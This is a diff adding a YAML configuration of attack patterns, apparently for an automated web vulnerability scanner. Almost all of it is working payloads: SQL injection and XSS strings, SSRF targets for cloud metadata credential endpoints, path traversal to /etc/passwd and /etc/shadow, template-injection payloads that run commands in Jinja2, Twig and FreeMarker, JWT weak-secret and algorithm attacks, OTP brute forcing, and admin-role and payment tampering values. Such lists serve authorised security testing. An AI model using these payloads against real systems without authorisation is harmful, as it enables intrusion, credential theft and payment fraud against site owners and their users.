@@ -1,0 +1,268 @@
+# attack_patterns.yaml — All Attack Patterns with Payloads
+# MilkyWay Intelligence | Author: Sharlix
+
+patterns:
+  idor:
+    id_params:
+      - id
+      - user_id
+      - userId
+      - order_id
+      - orderId
+      - uid
+      - pid
+      - doc_id
+      - file_id
+      - account_id
+      - accountId
+      - invoice_id
+      - ticket_id
+      - customer_id
+      - profile_id
+      - post_id
+      - member_id
+    id_types:
+      - integer_sequential
+      - uuid
+      - base64_encoded
+      - hash_md5
+    methods_to_test:
+      - GET
+      - POST
+      - PUT
+      - DELETE
+      - PATCH
+    severity: HIGH
+
+  jwt:
+    detection_patterns:
+      - "eyJ"
+    attacks:
+      - none_algorithm
+      - weak_secret_bruteforce
+      - alg_confusion_rs256_hs256
+      - kid_injection
+      - role_claim_tamper
+      - expiry_removal
+      - jku_ssrf
+    weak_secrets:
+      - secret
+      - password
+      - 123456
+      - jwt_secret
+      - mysecret
+      - test
+      - key
+      - private
+      - secretkey
+      - changeme
+      - supersecret
+      - qwerty
+      - letmein
+      - admin
+      - token
+    severity: CRITICAL
+
+  otp:
+    detection_patterns:
+      - otp
+      - verify
+      - code
+      - 2fa
+      - mfa
+      - confirm
+    length_patterns:
+      - 4_digit
+      - 6_digit
+      - 8_digit
+    attacks:
+      - brute_force
+      - reuse
+      - param_tamper
+      - response_manipulation
+      - concurrent_submission
+      - long_validity
+    max_brute_attempts: 10000
+    severity: CRITICAL
+
+  sqli:
+    payloads:
+      error_based:
+        - "'"
+        - "' OR '1'='1"
+        - "' OR 1=1--"
+        - "\" OR \"1\"=\"1"
+        - "'; SELECT 1--"
+      time_based:
+        - "1' AND SLEEP(3)--"
+        - "1' AND BENCHMARK(1000000,MD5(1))--"
+        - "1; WAITFOR DELAY '0:0:3'--"
+      union_based:
+        - "1 UNION SELECT NULL--"
+        - "1 UNION SELECT NULL,NULL--"
+        - "1 UNION SELECT NULL,NULL,NULL--"
+    error_signatures:
+      - "sql syntax"
+      - "mysql_fetch"
+      - "ora-"
+      - "sqlite3"
+      - "pg_query"
+      - "microsoft sql"
+      - "syntax error"
+      - "unclosed quotation"
+    severity: CRITICAL
+
+  xss:
+    payloads:
+      html_context:
+        - "<script>alert(document.domain)</script>"
+        - "<img src=x onerror=alert(1)>"
+        - "<svg onload=alert(1)>"
+        - "<details/open/ontoggle=alert(1)>"
+      attribute_context:
+        - "\" onmouseover=alert(1) x=\""
+        - "' onmouseover=alert(1) x='"
+        - "\" autofocus onfocus=alert(1) x=\""
+      js_context:
+        - "';alert(1);//"
+        - "\";alert(1);//"
+        - "\\';alert(1);//"
+      url_context:
+        - "javascript:alert(1)"
+        - "data:text/html,<script>alert(1)</script>"
+    severity: HIGH
+
+  ssrf:
+    target_urls:
+      - "http://169.254.169.254/latest/meta-data/"
+      - "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
+      - "http://metadata.google.internal/computeMetadata/v1/"
+      - "http://169.254.170.2/v2/metadata"
+    bypass_encodings:
+      - "http://0x7f000001/"
+      - "http://0177.0.0.1/"
+      - "http://127.1/"
+      - "http://[::1]/"
+    target_params:
+      - url
+      - uri
+      - path
+      - src
+      - source
+      - redirect
+      - next
+      - image
+      - link
+      - file
+      - fetch
+      - callback
+    severity: CRITICAL
+
+  lfi:
+    payloads:
+      unix:
+        - "../../etc/passwd"
+        - "../../../etc/passwd"
+        - "../../../../etc/passwd"
+        - "....//....//etc/passwd"
+        - "%2e%2e%2fetc%2fpasswd"
+        - "..%2F..%2Fetc%2Fpasswd"
+        - "../../etc/shadow"
+      windows:
+        - "../../windows/win.ini"
+        - "../../windows/system32/drivers/etc/hosts"
+      php_wrappers:
+        - "php://filter/read=convert.base64-encode/resource=index.php"
+        - "php://filter/read=convert.base64-encode/resource=config.php"
+        - "php://input"
+    target_params:
+      - file
+      - path
+      - include
+      - load
+      - template
+      - view
+      - page
+      - document
+      - dir
+    severity: CRITICAL
+
+  ssti:
+    probes:
+      - payload: "{{7*7}}"
+        expected: "49"
+        engines:
+          - Jinja2
+          - Twig
+      - payload: "${7*7}"
+        expected: "49"
+        engines:
+          - FreeMarker
+          - Spring EL
+      - payload: "#{7*7}"
+        expected: "49"
+        engines:
+          - Thymeleaf
+          - Ruby ERB
+      - payload: "<%=7*7%>"
+        expected: "49"
+        engines:
+          - ERB
+          - EJS
+    rce_payloads:
+      Jinja2: "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}"
+      Twig: "{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}"
+      FreeMarker: "<#assign ex=\"freemarker.template.utility.Execute\"?new()>${ex(\"id\")}"
+    severity: CRITICAL
+
+  cors:
+    test_origins:
+      - "https://evil.com"
+      - "null"
+      - "https://attacker.com"
+    severity_rules:
+      - condition: "origin_reflected AND credentials_true"
+        severity: CRITICAL
+      - condition: "origin_reflected"
+        severity: MEDIUM
+
+  mass_assignment:
+    inject_fields:
+      - role
+      - is_admin
+      - admin
+      - verified
+      - active
+      - balance
+      - credit
+      - is_staff
+      - is_superuser
+      - permissions
+    inject_values:
+      - "admin"
+      - "true"
+      - "1"
+      - "superuser"
+    severity: HIGH
+
+  payment:
+    test_params:
+      - amount
+      - price
+      - total
+      - cost
+      - fee
+      - charge
+      - value
+      - quantity
+      - discount
+    test_values:
+      - "0"
+      - "-1"
+      - "0.001"
+      - "0.00"
+      - "-100"
+      - "0.0000001"
+      - "999999"
+      - "-999"
+    severity: CRITICAL
